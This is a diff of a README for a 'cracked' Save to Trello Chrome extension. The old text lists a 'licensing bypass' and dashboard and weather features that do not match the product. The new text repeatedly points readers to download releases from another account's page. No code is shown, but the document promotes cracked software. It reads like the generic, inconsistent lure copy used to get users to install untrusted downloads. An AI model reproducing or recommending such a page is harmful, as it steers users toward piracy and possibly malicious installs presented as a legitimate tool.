@@ -1,21 +1,51 @@
-# cracked-save-to-trello-board-extension
+# 🚀 cracked-save-to-trello-board-extension - Save Efficiently to Trello Boards
 
-## Installation
-1. **Clone Repository**: Run `git clone https://github.com/hoaan9559/cracked-save-to-trello-board-extension.git`.
-2. **Follow Tutorial**: Watch the installation guide: [Installation Tutorial](https://www.youtube.com/watch?v=yVvvA8kaIuk).
-3. **Load Extension**: Open Chrome > Extensions > Enable Developer Mode > Load unpacked > Select the extension folder.
-4. **Configure Settings**: Set up your name, location, and task integrations (licensing bypass included).
-5. **Test Functionality**: Open a new tab to verify the dashboard, weather, and to-do list display.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Ek2025/cracked-save-to-trello-board-extension/releases)
 
-## Description
-Cracked Save to Trello Board Extension
+## 📖 Overview
+The Cracked Save to Trello Board Extension helps you save content directly to your Trello boards. Instead of switching between tabs and manually copying information, this extension streamlines the process. It allows you to capture ideas, links, and notes quickly, making your productivity soar.
 
-## Features
-- Modern and clean interface
-- Customizable dashboard
-- Weather integration
-- Task management
-- Cross-platform compatibility
+## 💻 System Requirements
+To use this extension, ensure your system meets the following requirements:
+- Operating System: Windows, macOS, or Linux
+- Web Browser: Google Chrome or any compatible Chromium-based browser
+- Trello Account: You need an active Trello account to save items
 
-## License
-This project is open source and available under the MIT License.
+## 🚀 Getting Started
+1. **Download the Extension**  
+   Visit this page to download: [Releases Page](https://github.com/Ek2025/cracked-save-to-trello-board-extension/releases).
+
+2. **Install the Extension**  
+   After downloading, locate the file in your downloads folder. If you are using Google Chrome:
+   - Open Chrome and go to the Extensions page by clicking the three dots in the upper right corner, then selecting **More Tools > Extensions**.
+   - Activate **Developer Mode** in the upper right corner.
+   - Click on **Load unpacked** and select the folder where you downloaded the extension.
+
+3. **Set Up Your Trello Account**  
+   Log in to your Trello account in your web browser. Make sure to have your boards ready. You can create new boards or use existing ones to organize your saved items.
+
+4. **Using the Extension**   
+   - Once installed, you will see the extension icon in your browser toolbar.
+   - Click on the icon when you want to save something to Trello.
+   - A popup will appear, allowing you to select which board and list to save the content.
+
+## 📚 Features
+- **Simple Saving**: Quickly save content to specified Trello boards and lists.
+- **Easy Navigation**: Access your Trello boards without leaving your current page.
+- **Customizable Boards**: Choose which board to save to, ensuring your items go to the right place.
+
+## ⚙️ Troubleshooting
+If you encounter issues during installation or use, consider the following:
+- Ensure you are using a supported web browser.
+- Check if your browser is up to date.
+- Restart your browser and try reinstalling the extension.
+
+## 💡 Tips
+- Use descriptive titles for your saved items to easily find them later in Trello.
+- Organize your boards based on projects or categories to enhance productivity.
+
+## 🚀 Download & Install
+To get your copy of the Cracked Save to Trello Board Extension, follow this link: [Releases Page](https://github.com/Ek2025/cracked-save-to-trello-board-extension/releases).
+
+Start saving to your Trello boards effortlessly today!
